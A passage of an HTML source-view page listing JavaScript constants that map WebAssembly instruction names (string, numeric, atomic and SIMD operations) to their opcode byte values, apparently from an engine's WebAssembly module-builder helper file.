0x94;</td></tr><tr><td class="line-number" value="644"></td><td class="line-content">  let kExprStringViewWtf8EncodeWtf8 = 0x95;</td></tr><tr><td class="line-number" value="645"></td><td class="line-content">  let kExprStringAsWtf16 = 0x98;</td></tr><tr><td class="line-number" value="646"></td><td class="line-content">  let kExprStringViewWtf16Length = 0x99;</td></tr><tr><td class="line-number" value="647"></td><td class="line-content">  let kExprStringViewWtf16GetCodeunit = 0x9a;</td></tr><tr><td class="line-number" value="648"></td><td class="line-content">  let kExprStringViewWtf16Encode = 0x9b;</td></tr><tr><td class="line-number" value="649"></td><td class="line-content">  let kExprStringViewWtf16Slice = 0x9c;</td></tr><tr><td class="line-number" value="650"></td><td class="line-content">  let kExprStringAsIter = 0xa0;</td></tr><tr><td class="line-number" value="651"></td><td class="line-content">  let kExprStringViewIterNext = 0xa1</td></tr><tr><td class="line-number" value="652"></td><td class="line-content">  let kExprStringViewIterAdvance = 0xa2;</td></tr><tr><td class="line-number" value="653"></td><td class="line-content">  let kExprStringViewIterRewind = 0xa3</td></tr><tr><td class="line-number" value="654"></td><td class="line-content">  let kExprStringViewIterSlice = 0xa4;</td></tr><tr><td class="line-number" value="655"></td><td class="line-content">  let kExprStringCompare = 0xa8;</td></tr><tr><td class="line-number" value="656"></td><td class="line-content">  let kExprStringFromCodePoint = 0xa9;</td></tr><tr><td class="line-number" value="657"></td><td class="line-content">  let kExprStringHash = 0xaa;</td></tr><tr><td class="line-number" value="658"></td><td class="line-content">  let kExprStringNewUtf8Array = 0xb0;</td></tr><tr><td class="line-number" value="659"></td><td class="line-content">  let kExprStringNewWtf16Array = 0xb1;</td></tr><tr><td class="line-number" value="660"></td><td class="line-content">  let kExprStringEncodeUtf8Array = 0xb2;</td></tr><tr><td class="line-number" value="661"></td><td class="line-content">  let kExprStringEncodeWtf16Array = 0xb3;</td></tr><tr><td class="line-number" value="662"></td><td class="line-content">  let kExprStringNewLossyUtf8Array = 0xb4;</td></tr><tr><td class="line-number" value="663"></td><td class="line-content">  let kExprStringNewWtf8Array = 0xb5;</td></tr><tr><td class="line-number" value="664"></td><td class="line-content">  let kExprStringEncodeLossyUtf8Array = 0xb6;</td></tr><tr><td class="line-number" value="665"></td><td class="line-content">  let kExprStringEncodeWtf8Array = 0xb7;</td></tr><tr><td class="line-number" value="666"></td><td class="line-content">  let kExprStringNewUtf8ArrayTry = 0xb8;</td></tr><tr><td class="line-number" value="667"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="668"></td><td class="line-content">  // Numeric opcodes.</td></tr><tr><td class="line-number" value="669"></td><td class="line-content">  let kExprI32SConvertSatF32 = 0x00;</td></tr><tr><td class="line-number" value="670"></td><td class="line-content">  let kExprI32UConvertSatF32 = 0x01;</td></tr><tr><td class="line-number" value="671"></td><td class="line-content">  let kExprI32SConvertSatF64 = 0x02;</td></tr><tr><td class="line-number" value="672"></td><td class="line-content">  let kExprI32UConvertSatF64 = 0x03;</td></tr><tr><td class="line-number" value="673"></td><td class="line-content">  let kExprI64SConvertSatF32 = 0x04;</td></tr><tr><td class="line-number" value="674"></td><td class="line-content">  let kExprI64UConvertSatF32 = 0x05;</td></tr><tr><td class="line-number" value="675"></td><td class="line-content">  let kExprI64SConvertSatF64 = 0x06;</td></tr><tr><td class="line-number" value="676"></td><td class="line-content">  let kExprI64UConvertSatF64 = 0x07;</td></tr><tr><td class="line-number" value="677"></td><td class="line-content">  let kExprMemoryInit = 0x08;</td></tr><tr><td class="line-number" value="678"></td><td class="line-content">  let kExprDataDrop = 0x09;</td></tr><tr><td class="line-number" value="679"></td><td class="line-content">  let kExprMemoryCopy = 0x0a;</td></tr><tr><td class="line-number" value="680"></td><td class="line-content">  let kExprMemoryFill = 0x0b;</td></tr><tr><td class="line-number" value="681"></td><td class="line-content">  let kExprTableInit = 0x0c;</td></tr><tr><td class="line-number" value="682"></td><td class="line-content">  let kExprElemDrop = 0x0d;</td></tr><tr><td class="line-number" value="683"></td><td class="line-content">  let kExprTableCopy = 0x0e;</td></tr><tr><td class="line-number" value="684"></td><td class="line-content">  let kExprTableGrow = 0x0f;</td></tr><tr><td class="line-number" value="685"></td><td class="line-content">  let kExprTableSize = 0x10;</td></tr><tr><td class="line-number" value="686"></td><td class="line-content">  let kExprTableFill = 0x11;</td></tr><tr><td class="line-number" value="687"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="688"></td><td class="line-content">  // Atomic opcodes.</td></tr><tr><td class="line-number" value="689"></td><td class="line-content">  let kExprAtomicNotify = 0x00;</td></tr><tr><td class="line-number" value="690"></td><td class="line-content">  let kExprI32AtomicWait = 0x01;</td></tr><tr><td class="line-number" value="691"></td><td class="line-content">  let kExprI64AtomicWait = 0x02;</td></tr><tr><td class="line-number" value="692"></td><td class="line-content">  let kExprI32AtomicLoad = 0x10;</td></tr><tr><td class="line-number" value="693"></td><td class="line-content">  let kExprI32AtomicLoad8U = 0x12;</td></tr><tr><td class="line-number" value="694"></td><td class="line-content">  let kExprI32AtomicLoad16U = 0x13;</td></tr><tr><td class="line-number" value="695"></td><td class="line-content">  let kExprI32AtomicStore = 0x17;</td></tr><tr><td class="line-number" value="696"></td><td class="line-content">  let kExprI32AtomicStore8U = 0x19;</td></tr><tr><td class="line-number" value="697"></td><td class="line-content">  let kExprI32AtomicStore16U = 0x1a;</td></tr><tr><td class="line-number" value="698"></td><td class="line-content">  let kExprI32AtomicAdd = 0x1e;</td></tr><tr><td class="line-number" value="699"></td><td class="line-content">  let kExprI32AtomicAdd8U = 0x20;</td></tr><tr><td class="line-number" value="700"></td><td class="line-content">  let kExprI32AtomicAdd16U = 0x21;</td></tr><tr><td class="line-number" value="701"></td><td class="line-content">  let kExprI32AtomicSub = 0x25;</td></tr><tr><td class="line-number" value="702"></td><td class="line-content">  let kExprI32AtomicSub8U = 0x27;</td></tr><tr><td class="line-number" value="703"></td><td class="line-content">  let kExprI32AtomicSub16U = 0x28;</td></tr><tr><td class="line-number" value="704"></td><td class="line-content">  let kExprI32AtomicAnd = 0x2c;</td></tr><tr><td class="line-number" value="705"></td><td class="line-content">  let kExprI32AtomicAnd8U = 0x2e;</td></tr><tr><td class="line-number" value="706"></td><td class="line-content">  let kExprI32AtomicAnd16U = 0x2f;</td></tr><tr><td class="line-number" value="707"></td><td class="line-content">  let kExprI32AtomicOr = 0x33;</td></tr><tr><td class="line-number" value="708"></td><td class="line-content">  let kExprI32AtomicOr8U = 0x35;</td></tr><tr><td class="line-number" value="709"></td><td class="line-content">  let kExprI32AtomicOr16U = 0x36;</td></tr><tr><td class="line-number" value="710"></td><td class="line-content">  let kExprI32AtomicXor = 0x3a;</td></tr><tr><td class="line-number" value="711"></td><td class="line-content">  let kExprI32AtomicXor8U = 0x3c;</td></tr><tr><td class="line-number" value="712"></td><td class="line-content">  let kExprI32AtomicXor16U = 0x3d;</td></tr><tr><td class="line-number" value="713"></td><td class="line-content">  let kExprI32AtomicExchange = 0x41;</td></tr><tr><td class="line-number" value="714"></td><td class="line-content">  let kExprI32AtomicExchange8U = 0x43;</td></tr><tr><td class="line-number" value="715"></td><td class="line-content">  let kExprI32AtomicExchange16U = 0x44;</td></tr><tr><td class="line-number" value="716"></td><td class="line-content">  let kExprI32AtomicCompareExchange = 0x48;</td></tr><tr><td class="line-number" value="717"></td><td class="line-content">  let kExprI32AtomicCompareExchange8U = 0x4a;</td></tr><tr><td class="line-number" value="718"></td><td class="line-content">  let kExprI32AtomicCompareExchange16U = 0x4b;</td></tr><tr><td class="line-number" value="719"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="720"></td><td class="line-content">  let kExprI64AtomicLoad = 0x11;</td></tr><tr><td class="line-number" value="721"></td><td class="line-content">  let kExprI64AtomicLoad8U = 0x14;</td></tr><tr><td class="line-number" value="722"></td><td class="line-content">  let kExprI64AtomicLoad16U = 0x15;</td></tr><tr><td class="line-number" value="723"></td><td class="line-content">  let kExprI64AtomicLoad32U = 0x16;</td></tr><tr><td class="line-number" value="724"></td><td class="line-content">  let kExprI64AtomicStore = 0x18;</td></tr><tr><td class="line-number" value="725"></td><td class="line-content">  let kExprI64AtomicStore8U = 0x1b;</td></tr><tr><td class="line-number" value="726"></td><td class="line-content">  let kExprI64AtomicStore16U = 0x1c;</td></tr><tr><td class="line-number" value="727"></td><td class="line-content">  let kExprI64AtomicStore32U = 0x1d;</td></tr><tr><td class="line-number" value="728"></td><td class="line-content">  let kExprI64AtomicAdd = 0x1f;</td></tr><tr><td class="line-number" value="729"></td><td class="line-content">  let kExprI64AtomicAdd8U = 0x22;</td></tr><tr><td class="line-number" value="730"></td><td class="line-content">  let kExprI64AtomicAdd16U = 0x23;</td></tr><tr><td class="line-number" value="731"></td><td class="line-content">  let kExprI64AtomicAdd32U = 0x24;</td></tr><tr><td class="line-number" value="732"></td><td class="line-content">  let kExprI64AtomicSub = 0x26;</td></tr><tr><td class="line-number" value="733"></td><td class="line-content">  let kExprI64AtomicSub8U = 0x29;</td></tr><tr><td class="line-number" value="734"></td><td class="line-content">  let kExprI64AtomicSub16U = 0x2a;</td></tr><tr><td class="line-number" value="735"></td><td class="line-content">  let kExprI64AtomicSub32U = 0x2b;</td></tr><tr><td class="line-number" value="736"></td><td class="line-content">  let kExprI64AtomicAnd = 0x2d;</td></tr><tr><td class="line-number" value="737"></td><td class="line-content">  let kExprI64AtomicAnd8U = 0x30;</td></tr><tr><td class="line-number" value="738"></td><td class="line-content">  let kExprI64AtomicAnd16U = 0x31;</td></tr><tr><td class="line-number" value="739"></td><td class="line-content">  let kExprI64AtomicAnd32U = 0x32;</td></tr><tr><td class="line-number" value="740"></td><td class="line-content">  let kExprI64AtomicOr = 0x34;</td></tr><tr><td class="line-number" value="741"></td><td class="line-content">  let kExprI64AtomicOr8U = 0x37;</td></tr><tr><td class="line-number" value="742"></td><td class="line-content">  let kExprI64AtomicOr16U = 0x38;</td></tr><tr><td class="line-number" value="743"></td><td class="line-content">  let kExprI64AtomicOr32U = 0x39;</td></tr><tr><td class="line-number" value="744"></td><td class="line-content">  let kExprI64AtomicXor = 0x3b;</td></tr><tr><td class="line-number" value="745"></td><td class="line-content">  let kExprI64AtomicXor8U = 0x3e;</td></tr><tr><td class="line-number" value="746"></td><td class="line-content">  let kExprI64AtomicXor16U = 0x3f;</td></tr><tr><td class="line-number" value="747"></td><td class="line-content">  let kExprI64AtomicXor32U = 0x40;</td></tr><tr><td class="line-number" value="748"></td><td class="line-content">  let kExprI64AtomicExchange = 0x42;</td></tr><tr><td class="line-number" value="749"></td><td class="line-content">  let kExprI64AtomicExchange8U = 0x45;</td></tr><tr><td class="line-number" value="750"></td><td class="line-content">  let kExprI64AtomicExchange16U = 0x46;</td></tr><tr><td class="line-number" value="751"></td><td class="line-content">  let kExprI64AtomicExchange32U = 0x47;</td></tr><tr><td class="line-number" value="752"></td><td class="line-content">  let kExprI64AtomicCompareExchange = 0x49</td></tr><tr><td class="line-number" value="753"></td><td class="line-content">  let kExprI64AtomicCompareExchange8U = 0x4c;</td></tr><tr><td class="line-number" value="754"></td><td class="line-content">  let kExprI64AtomicCompareExchange16U = 0x4d;</td></tr><tr><td class="line-number" value="755"></td><td class="line-content">  let kExprI64AtomicCompareExchange32U = 0x4e;</td></tr><tr><td class="line-number" value="756"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="757"></td><td class="line-content">  // Simd opcodes.</td></tr><tr><td class="line-number" value="758"></td><td class="line-content">  let kExprS128LoadMem = 0x00;</td></tr><tr><td class="line-number" value="759"></td><td class="line-content">  let kExprS128Load8x8S = 0x01;</td></tr><tr><td class="line-number" value="760"></td><td class="line-content">  let kExprS128Load8x8U = 0x02;</td></tr><tr><td class="line-number" value="761"></td><td class="line-content">  let kExprS128Load16x4S = 0x03;</td></tr><tr><td class="line-number" value="762"></td><td class="line-content">  let kExprS128Load16x4U = 0x04;</td></tr><tr><td class="line-number" value="763"></td><td class="line-content">  let kExprS128Load32x2S = 0x05;</td></tr><tr><td class="line-number" value="764"></td><td class="line-content">  let kExprS128Load32x2U = 0x06;</td></tr><tr><td class="line-number" value="765"></td><td class="line-content">  let kExprS128Load8Splat = 0x07;</td></tr><tr><td class="line-number" value="766"></td><td class="line-content">  let kExprS128Load16Splat = 0x08;</td></tr><tr><td class="line-number" value="767"></td><td class="line-content">  let kExprS128Load32Splat = 0x09;</td></tr><tr><td class="line-number" value="768"></td><td class="line-content">  let kExprS128Load64Splat = 0x0a;</td></tr><tr><td class="line-number" value="769"></td><td class="line-content">  let kExprS128StoreMem = 0x0b;</td></tr><tr><td class="line-number" value="770"></td><td class="line-content">  let kExprS128Const = 0x0c;</td></tr><tr><td class="line-number" value="771"></td><td class="line-content">  let kExprI8x16Shuffle = 0x0d;</td></tr><tr><td class="line-number" value="772"></td><td class="line-content">  let kExprI8x16Swizzle = 0x0e;</td></tr><tr><td class="line-number" value="773"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="774"></td><td class="line-content">  let kExprI8x16Splat = 0x0f;</td></tr><tr><td class="line-number" value="775"></td><td class="line-content">  let kExprI16x8Splat = 0x10;</td></tr><tr><td class="line-number" value="776"></td><td class="line-content">  let kExprI32x4Splat = 0x11;</td></tr><tr><td class="line-number" value="777"></td><td class="line-content">  let kExprI64x2Splat = 0x12;</td></tr><tr><td class="line-number" value="778"></td><td class="line-content">  let kExprF32x4Splat = 0x13;</td></tr><tr><td class="line-number" value="779"></td><td class="line-content">  let kExprF64x2Splat = 0x14;</td></tr><tr><td class="line-number" value="780"></td><td class="line-content">  let kExprI8x16ExtractLaneS = 0x15;</td></tr><tr><td class="line-number" value="781"></td><td class="line-content">  let kExprI8x16ExtractLaneU = 0x16;</td></tr><tr><td class="line-number" value="782"></td><td class="line-content">  let kExprI8x16ReplaceLane = 0x17;</td></tr><tr><td class="line-number" value="783"></td><td class="line-content">  let kExprI16x8ExtractLaneS = 0x18;</td></tr><tr><td class="line-number" value="784"></td><td class="line-content">  let kExprI16x8ExtractLaneU = 0x19;</td></tr><tr><td class="line-number" value="785"></td><td class="line-content">  let kExprI16x8ReplaceLane = 0x1a;</td></tr><tr><td class="line-number" value="786"></td><td class="line-content">  let kExprI32x4ExtractLane = 0x1b;</td></tr><tr><td class="line-number" value="787"></td><td class="line-content">  let kExprI32x4ReplaceLane = 0x1c;</td></tr><tr><td class="line-number" value="788"></td><td class="line-content">  let kExprI64x2ExtractLane = 0x1d;</td></tr><tr><td class="line-number" value="789"></td><td class="line-content">  let kExprI64x2ReplaceLane = 0x1e;</td></tr><tr><td class="line-number" value="790"></td><td class="line-content">  let kExprF32x4ExtractLane = 0x1f;</td></tr><tr><td class="line-number" value="791"></td><td class="line-content">  let kExprF32x4ReplaceLane = 0x20;</td></tr><tr><td class="line-number" value="792"></td><td class="line-content">  let kExprF64x2ExtractLane = 0x21;</td></tr><tr><td class="line-number" value="793"></td><td class="line-content">  let kExprF64x2ReplaceLane = 0x22;</td></tr><tr><td class="line-number" value="794"></td><td class="line-content">  let kExprI8x16Eq = 0x23;</td></tr><tr><td class="line-number" value="795"></td><td class="line-content">  let kExprI8x16Ne = 0x24;</td></tr><tr><td class="line-number" value="796"></td><td class="line-content">  let kExprI8x16LtS = 0x25;</td></tr><tr><td class="line-number" value="797"></td><td class="line-content">  let kExprI8x16LtU = 0x26;</td></tr><tr><td class="line-number" value="798"></td><td class="line-content">  let kExprI8x16GtS = 0x27;</td></tr><tr><td class="line-number" value="799"></td><td class="line-content">  let kExprI8x16GtU = 0x28;</td></tr><tr><td class="line-number" value="800"></td><td class="line-content">  let kExprI8x16LeS = 0x29;</td></tr><tr><td class="line-number" value="801"></td><td class="line-content">  let kExprI8x16LeU = 0x2a;</td></tr><tr><td class="line-number" value="802"></td><td class="line-content">  let kExprI8x16GeS = 0x2b;</td></tr><tr><td class="line-number" value="803"></td><td class="line-content">  let kExprI8x16GeU = 0x2c;</td></tr><tr><td class="line-number" value="804"></td><td class="line-content">  let kExprI16x8Eq = 0x2d;</td></tr><tr><td class="line-number" value="805"></td><td class="line-content">  let kExprI16x8Ne = 0x2e;</td></tr><tr><td class="line-number" value="806"></td><td class="line-content">  let kExprI16x8LtS = 0x2f;</td></tr><tr><td class="line-number" value="807"></td><td class="line-content">  let kExprI16x8LtU = 0x30;</td></tr><tr><td class="line-number" value="808"></td><td class="line-content">  let kExprI16x8GtS = 0x31;</td></tr><tr><td class="line-number" value="809"></td><td class="line-content">  let kExprI16x8GtU = 0x32;</td></tr><tr><td class="line-number" value="810"></td><td class="line-content">  let kExprI16x8LeS = 0x33;</td></tr><tr><td class="line-number" value="811"></td><td class="line-content">  let kExprI16x8LeU = 0x34;</td></tr><tr><td class="line-number" value="812"></td><td class="line-content">  let kExprI16x8GeS = 0x35;</td></tr><tr><td class="line-number" value="813"></td><td class="line-content">  let kExprI16x8GeU = 0x36;</td></tr><tr><td class="line-number" value="814"></td><td class="line-content">  let kExprI32x4Eq = 0x37;</td></tr><tr><td class="line-number" value="815"></td><td class="line-content">  let kExprI32x4Ne = 0x38;</td></tr><tr><td class="line-number" value="816"></td><td class="line-content">  let kExprI32x4LtS = 0x39;</td></tr><tr><td class="line-number" value="817"></td><td class="line-content">  let kExprI32x4LtU = 0x3a;</td></tr><tr><td class="line-number" value="818"></td><td class="line-content">  let kExprI32x4GtS = 0x3b;</td></tr><tr><td class="line-number" value="819"></td><td class="line-content">  let kExprI32x4GtU = 0x3c;</td></tr><tr><td class="line-number" value="820"></td><td class="line-content">  let kExprI32x4LeS = 0x3d;</td></tr><tr><td class="line-number" value="821"></td><td class="line-content">  let kExprI32x4LeU = 0x3e;</td></tr><tr><td class="line-number" value="822"></td><td class="line-content">  let kExprI32x4GeS = 0x3f;</td></tr><tr><td class="line-number" value="823"></td><td class="line-content">  let kExprI32x4GeU = 0x40;</td></tr><tr><td class="line-number" value="824"></td><td class="line-content">  let kExprF32x4Eq = 0x41;</td></tr><tr><td class="line-number" value="825"></td><td class="line-content">  let kExprF32x4Ne = 0x42;</td></tr><tr><td class="line-number" value="826"></td><td class="line-content">  let kExprF32x4Lt = 0x43;</td></tr><tr><td class="line-number" value="827"></td><td class="line-content">  let kExprF32x4Gt = 0x44;</td></tr><tr><td class="line-number" value="828"></td><td class="line-content">  let kExprF32x4Le = 0x45;</td></tr><tr><td class="line-number" value="829"></td><td class="line-content">  let kExprF32x4Ge = 0x46;</td></tr><tr><td class="line-number" value="830"></td><td class="line-content">  let kExprF64x2Eq = 0x47;</td></tr><tr><td class="line-number" value="831"></td><td class="line-content">  let kExprF64x2Ne = 0x48;</td></tr><tr><td class="line-number" value="832"></td><td class="line-content">  let kExprF64x2Lt = 0x49;</td></tr><tr><td class="line-number" value="833"></td><td class="line-content">  let kExprF64x2Gt = 0x4a;</td></tr><tr><td class="line-number" value="834"></td><td class="line-content">  let kExprF64x2Le = 0x4b;</td></tr><tr><td class="line-number" value="835"></td><td class="line-content">  let kExprF64x2Ge = 0x4c;</td></tr><tr><td class="line-number" value="836"></td><td class="line-content">  let kExprS128Not = 0x4d;</td></tr><tr><td class="line-number" value="837"></td><td class="line-content">  let kExprS128And = 0x4e;</td></tr><tr><td class="line-number" value="838"></td><td class="line-content">  let kExprS128AndNot = 0x4f;</td></tr><tr><td class="line-number" value="839"></td><td class="line-content">  let kExprS128Or = 0x50;</td></tr><tr><td class="line-number" value="840"></td><td class="line-content">  let kExprS128Xor = 0x51;</td></tr><tr><td class="line-number" value="841"></td><td class="line-content">  let kExprS128Select = 0x52;</td></tr><tr><td class="line-number" value="842"></td><td class="line-content">  let kExprV128AnyTrue = 0x53;</td></tr><tr><td class="line-number" value="843"></td><td class="line-content">  let kExprS128Load8Lane = 0x54;</td></tr><tr><td class="line-number" value="844"></td><td class="line-content">  let kExprS128Load16Lane = 0x55;</td></tr><tr><td class="line-number" value="845"></td><td class="line-content">  let kExprS128Load32Lane = 0x56;</td></tr><tr><td class="line-number" value="846"></td><td class="line-content">  let kExprS128Load64Lane = 0x57;</td></tr><tr><td class="line-number" value="847"></td><td class="line-content">  let kExprS128Store8Lane = 0x58;</td></tr><tr><td class="line-number" value="848"></td><td class="line-content">  let kExprS128Store16Lane = 0x59;</td></tr><tr><td class="line-number" value="849"></td><td class="line-content">  let kExprS128Store32Lane = 0x5a;</td></tr><tr><td class="line-number" value="850"></td><td class="line-content">  let kExprS128Store64Lane = 0x5b;</td></tr><tr><td class="line-number" value="851"></td><td class="line-content">  let kExprS128Load32Zero = 0x5c;</td></tr><tr><td class="line-number" value="852"></td><td class="line-content">  let kExprS128Load64Zero = 0x5d;</td></tr><tr><td class="line-number" value="853"></td><td class="line-content">  let kExprF32x4DemoteF64x2Zero = 0x5e;</td></tr><tr><td class="line-number" value="854"></td><td class="line-content">  let kExprF64x2PromoteLowF32x4 = 0x5f;</td></tr><tr><td class="line-number" value="855"></td><td class="line-content">  let kExprI8x16Abs = 0x60;</td></tr><tr><td class="line-number" value="856"></td><td class="line-content">  let kExprI8x16Neg = 0x61;</td></tr><tr><td class="line-number" value="857"></td><td class="line-content">  let kExprI8x16Popcnt = 0x62;</td></tr><tr><td class="line-number" value="858"></td><td class="line-content">  let kExprI8x16AllTrue = 0x63;</td></tr><tr><td class="line-number" value="859"></td><td class="line-content">  let kExprI8x16BitMask = 0x64;</td></tr><tr><td class="line-number" value="860"></td><td class="line-content">  let kExprI8x16SConvertI16x8 = 0x65;</td></tr><tr><td class="line-number" value="861"></td><td class="line-content">  let kExprI8x16UConvertI16x8 = 0x66;</td></tr><tr><td class="line-number" value="862"></td><td class="line-content">  let kExprF32x4Ceil = 0x67;</td></tr><tr><td class="line-number" value="863"></td><td class="line-content">  let kExprF32x4Floor = 0x68;</td></tr><tr><td class="line-number" value="864"></td><td class="line-content">  let kExprF32x4Trunc = 0x69;</td></tr><tr><td class="line-number" value="865"></td><td class="line-content">  let kExprF32x4NearestInt = 0x6a;</td></tr><tr><td class="line-number" value="866"></td><td class="line-content">  let kExprI8x16Shl = 0x6b;</td></tr><tr><td class="line-number" value="867"></td><td class="line-content">  let kExprI8x16ShrS = 0x6c;</td></tr><tr><td class="line-number" value="868"></td><td class="line-content">  let kExprI8x16ShrU = 0x6d;</td></tr><tr><td class="line-number" value="869"></td><td class="line-content">  let kExprI8x16Add = 0x6e;</td></tr><tr><td class="line-number" value="870"></td><td class="line-content">  let kExprI8x16AddSatS = 0x6f;</td></tr><tr><td class="line-number" value="871"></td><td class="line-content">  let kExprI8x16AddSatU = 0x70;</td></tr><tr><td class="line-number" value="872"></td><td class="line-content">  let kExprI8x16Sub = 0x71;</td></tr><tr><td class="line-number" value="873"></td><td class="line-content">  let kExprI8x16SubSatS = 0x72;</td></tr><tr><td class="line-number" value="874"></td><td class="line-content">  let kExprI8x16SubSatU = 0x73;</td></tr><tr><td class="line-number" value="875"></td><td class="line-content">  let kExprF64x2Ceil = 0x74;</td></tr><tr><td class="line-number" value="876"></td><td class="line-content">  let kExprF64x2Floor = 0x75;</td></tr><tr><td class="line-number" value="877"></td><td class="line-content">  let kExprI8x16MinS = 0x76;</td></tr><tr><td class="line-number" value="878"></td><td class="line-content">  let kExprI8x16MinU = 0x77;</td></tr><tr><td class="line-number" value="879"></td><td class="line-content">  let kExprI8x16MaxS = 0x78;</td></tr><tr><td class="line-number" value="880"></td><td class="line-content">  let kExprI8x16MaxU = 0x79;</td></tr><tr><td class="line-number" value="881"></td><td class="line-content">  let kExprF64x2Trunc = 0x7a;</td></tr><tr><td class="line-number" value="882"></td><td class="line-content">  let kExprI8x16RoundingAverageU = 0x7b;</td></tr><tr><td class="line-number" value="883"></td><td class="line-content">  let kExprI16x8ExtAddPairwiseI8x16S = 0x7c;</td></tr><tr><td class="line-number" value="884"></td><td class="line-content">  let kExprI16x8ExtAddPairwiseI8x16U = 0x7d;</td></tr><tr><td class="line-number" value="885"></td><td class="line-content">  let kExprI32x4ExtAddPairwiseI16x8S = 0x7e;</td></tr><tr><td class="line-number" value="886"></td><td class="line-content">  let kExprI32x4ExtAddPairwiseI16x8U = 0x7f;</td></tr><tr><td class="line-number" value="887"></td><td class="line-content">  let kExprI16x8Abs = 0x80;</td></tr><tr><td class="line-number" value="888"></td><td class="line-content">  let kExprI16x8Neg = 0x81;</td></tr><tr><td class="line-number" value="889"></td><td class="line-content">  let kExprI16x8Q15MulRSatS = 0x82;</td></tr><tr><td class="line-number" value="890"></td><td class="line-content">  let kExprI16x8AllTrue = 0x83;</td></tr><tr><td class="line-number" value="891"></td><td class="line-content">  let kExprI16x8BitMask = 0x84;</td></tr><tr><td class="line-number" value="892"></td><td class="line-content">  let kExprI16x8SConvertI32x4 = 0x85;</td></tr><tr><td class="line-number" value="893"></td><td class="line-content">  let kExprI16x8UConvertI32x4 = 0x86;</td></tr><tr><td class="line-number" value="894"></td><td class="line-content">  let kExprI16x8SConvertI8x16Low = 0x87;</td></tr><tr><td class="line-number" value="895"></td><td class="line-content">  let kExprI16x8SConvertI8x16High = 0x88;</td></tr><tr><td class="line-number" value="896"></td><td class="line-content">  let kExprI16x8UConvertI8x16Low = 0x89;</td></tr><tr><td class="line-number" value="897"></td><td class="line-content">  let kExprI16x8UConvertI8x16High = 0x8a;</td></tr><tr><td class="line-number" value="898"></td><td class="line-content">  let kExprI16x8Shl = 0x8b;</td></tr><tr><td class="line-number" value="899"></td><td class="line-content">  let kExprI16x8ShrS = 0x8c;</td></tr><tr><td class="line-number" value="900"></td><td class="line-content">  let kExprI16x8ShrU = 0x8d;</td></tr><tr><td class="line-number" value="901"></td><td class="line-content">  let kExprI16x8Add = 0x8e;</td></tr><tr><td class="line-number" value="902"></td><td class="line-content">  let kExprI16x8AddSatS = 0x8f;</td></tr><tr><td class="line-number" value="903"></td><td class="line-content">  let kExprI16x8AddSatU = 0x90;</td></tr><tr><td class="line-number" value="904"></td><td class="line-content">  let kExprI16x8Sub = 0x91;</td></tr><tr><td class="line-number" value="905"></td><td class="line-content">  let kExprI16x8SubSatS = 0x92;</td></tr><tr><td class="line-number" value="906"></td><td class="line-content">  let kExprI16x8SubSatU = 0x93;</td></tr><tr><td class="line-number" value="907"></td><td class="line-content">  let kExprF64x2NearestInt = 0x94;</td></tr><tr><td class="line-number" value="908"></td><td class="line-content">  let kExprI16x8Mul = 0x95;</td></tr><tr><td class="line-number" value="909"></td><td class="line-content">  let kExprI16x8MinS = 0x96;</td></tr><tr><td class="line-number" value="910"></td><td class="line-content">  let kExprI16x8MinU = 0x97;</td></tr><tr><td class="line-number" value="911"></td><td class="line-content">  let kExprI16x8MaxS = 0x98;</td></tr><tr><td class="line-number" value="912"></td><td class="line-content">  let kExprI16x8MaxU = 0x99;</td></tr><tr><td class="line-number" value="913"></td><td class="line-content">  let kExprI16x8RoundingAverageU = 0x9b;</td></tr><tr><td class="line-number" value="914"></td><td class="line-content">  let kExprI16x8ExtMulLowI8x16S = 0x9c;</td></tr><tr><td class="line-number" value="915"></td><td class="line-content">  let kExprI16x8ExtMulHighI8x16S = 0x9d;</td></tr><tr><td class="line-number" value="916"></td><td class="line-content">  let kExprI16x8ExtMulLowI8x16U = 0x9e;</td></tr><tr><td class="line-number" value="917"></td><td class="line-content">  let kExprI16x8ExtMulHighI8x16U = 0x9f;</td></tr><tr><td class="line-number" value="918"></td><td class="line-content">  let kExprI32x4Abs = 0xa0;</td></tr><tr><td class="line-number" value="919"></td><td class="line-content">  let kExprI32x4Neg = 0xa1;</td></tr><tr><td class="line-number" value="920"></td><td class="line-content">  let kExprI32x4AllTrue = 0xa3;</td></tr><tr><td class="line-number" value="921"></td><td class="line-content">  let kExprI32x4BitMask = 0xa4;</td></tr><tr><td class="line-number" value="922"></td><td class="line-content">  let kExprI32x4SConvertI16x8Low = 0xa7;</td></tr><tr><td class="line-number" value="923"></td><td class="line-content">  let kExprI32x4SConvertI16x8High = 0xa8;</td></tr><tr><td class="line-number" value="924"></td><td class="line-content">  let kExprI32x4UConvertI16x8Low = 0xa9;</td></tr><tr><td class="line-number" value="925"></td><td class="line-content">  let kExprI32x4UConvertI16x8High = 0xaa;</td></tr><tr><td class="line-number" value="926"></td><td class="line-content">  let kExprI32x4Shl = 0xab;</td></tr><tr><td class="line-number" value="927"></td><td class="line-content">  let kExprI32x4ShrS = 0xac;</td></tr><tr><td class="line-number" value="928"></td><td class="line-content">  let kExprI32x4ShrU = 0xad;</td></tr><tr><td class="line-number" value="929"></td><td class="line-content">  let kExprI32x4Add = 0xae;</td></tr><tr><td class="line-number" value="930"></td><td class="line-content">  let kExprI32x4Sub = 0xb1;</td></tr><tr><td class="line-number" value="931"></td><td class="line-content">  let kExprI32x4Mul = 0xb5;</td></tr><tr><td class="line-number" value="932"></td><td class="line-content">  let kExprI32x4MinS = 0xb6;</td></tr><tr><td class="line-number" value="933"></td><td class="line-content">  let kExprI32x4MinU = 0xb7;</td></tr><tr><td class="line-number" value="934"></td><td class="line-content">  let kExprI32x4MaxS = 0xb8;</td></tr><tr><td class="line-number" value="935"></td><td class="line-content">  let kExprI32x4MaxU = 0xb9;</td></tr><tr><td class="line-number" value="936"></td><td class="line-content">  let kExprI32x4DotI16x8S = 0xba;</td></tr><tr><td class="line-number" value="937"></td><td class="line-content">  let kExprI32x4ExtMulLowI16x8S = 0xbc;</td></tr><tr><td class="line-number" value="938"></td><td class="line-content">  let kExprI32x4ExtMulHighI16x8S = 0xbd;</td></tr><tr><td class="line-number" value="939"></td><td class="line-content">  let kExprI32x4ExtMulLowI16x8U = 0xbe;</td></tr><tr><td class="line-number" value="940"></td><td class="line-content">  let kExprI32x4ExtMulHighI16x8U = 0xbf;</td></tr><tr><td class="line-number" value="941"></td><td class="line-content">  let kExprI64x2Abs = 0xc0;</td></tr><tr><td class="line-number" value="942"></td><td class="line-content">  let 